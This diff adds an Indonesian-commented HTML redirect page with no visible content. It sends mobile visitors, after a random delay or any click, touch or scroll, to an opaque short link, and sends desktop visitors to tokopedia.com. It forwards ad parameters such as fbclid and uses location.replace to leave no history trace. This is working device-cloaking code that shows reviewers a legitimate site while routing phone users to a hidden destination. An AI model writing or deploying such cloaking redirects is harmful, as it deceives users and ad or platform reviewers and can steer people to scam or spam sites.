@@ -1,0 +1,66 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Loading...</title>
+
+<script>
+(function () {
+  // Tentukan URL tujuan berdasarkan perangkat
+  var isMobile =
+    /Android|iPhone|iPad|iPod|Opera Mini|IEMobile|WPDesktop/i.test(
+      navigator.userAgent
+    );
+
+  var DESTINATION_URL = isMobile
+    ? 'https://getzal.link/Seoc123'
+    : 'https://tokopedia.com';
+
+  // Delay redirect acak antara 800ms - 1500ms
+  // (bisa diubah sesuai kebutuhan, atau dihilangkan jika ingin redirect instan)
+  var REDIRECT_DELAY_MS =
+    Math.floor(Math.random() * (1500 - 800 + 1)) + 800;
+
+  // Fungsi untuk membangun URL redirect dengan mempertahankan query string
+  function buildRedirectUrl() {
+    var current = new URL(window.location.href);
+    var dest = new URL(DESTINATION_URL);
+
+    // Salin semua parameter dari URL asal ke URL tujuan
+    // (berguna untuk meneruskan parameter seperti ?fbclid=... dari iklan)
+    current.searchParams.forEach(function(value, key) {
+      if (!dest.searchParams.has(key)) {
+        dest.searchParams.set(key, value);
+      }
+    });
+
+    return dest.toString();
+  }
+
+  var redirected = false;
+
+  function doRedirect() {
+    if (redirected) return;
+    redirected = true;
+    // Gunakan replace agar halaman ini tidak tersimpan di history browser
+    window.location.replace(buildRedirectUrl());
+  }
+
+  // Redirect otomatis setelah delay
+  setTimeout(doRedirect, REDIRECT_DELAY_MS);
+
+  // Redirect juga jika pengguna berinteraksi (klik, sentuh, scroll)
+  // Ini mempercepat redirect jika pengguna aktif
+  window.addEventListener('click', doRedirect, { once: true });
+  window.addEventListener('touchstart', doRedirect, { once: true });
+  window.addEventListener('scroll', doRedirect, { once: true });
+
+})();
+</script>
+</head>
+
+<body>
+  <!-- Tidak ada konten visual, hanya halaman redirect -->
+</body>
+</html>
